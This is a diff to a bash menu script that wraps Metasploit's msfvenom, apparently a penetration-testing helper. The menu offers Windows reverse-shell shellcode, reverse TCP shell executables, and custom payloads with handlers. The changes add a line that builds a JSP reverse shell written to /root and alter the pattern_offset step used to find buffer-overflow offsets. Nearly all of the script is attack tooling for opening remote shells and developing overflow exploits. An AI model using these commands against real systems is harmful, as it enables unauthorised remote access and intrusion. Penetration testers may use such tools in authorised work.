@@ -220,8 +220,8 @@ echo "1) Generate Windows Reverse SHELLCODE"
 echo "2) Generate Reverse tcp Shell exe"
 echo "3) Generate CUSTOM PAYLOAD"
 echo "4) Generate CUSTOM PAYLOAD and Handler"
-echo "5) Generate Unique String of size N"
-echo "6) Run PatternOffset for Unique string"
+echo "5) Generate Unique String of size N (Pattern_offset)" 
+echo "6) Get exact Patternoffset match value"
 echo "7) Search for MSF Payload"
 echo "8) Search for MSF Payload Format"
 echo ""
@@ -278,6 +278,7 @@ echo "Payloads Ref's:"
 echo "Linux=linux/x86/shell_reverse_tcp"
 echo "Windows=windows/shell_reverse_tcp"
 echo "Tomcat/jsp=java/jsp_shell_reverse_tcp"
+echo "JavaServerPage=LHOST LPORT -p java/jsp_shell_reverse_tcp --platform windows -o /root/MSFV_java4444.jsp"
 echo ""
 echo "Search Term to look for in Payload title: "
 read searchterm
@@ -391,9 +392,11 @@ read size
 func_MSFVEnom_Menu
 ;;
 6)
-echo "Enter EIP Reg char digits: "
+echo "Enter byte size BOF array in digits: "
+read bytesize
+echo "Enter memory address of EIP reg in when BOF executed(in digitsw): "
 read EIP
-/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $EIP
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb $bytesize -q $EIP
 func_MSFVEnom_Menu
 ;;
 7)
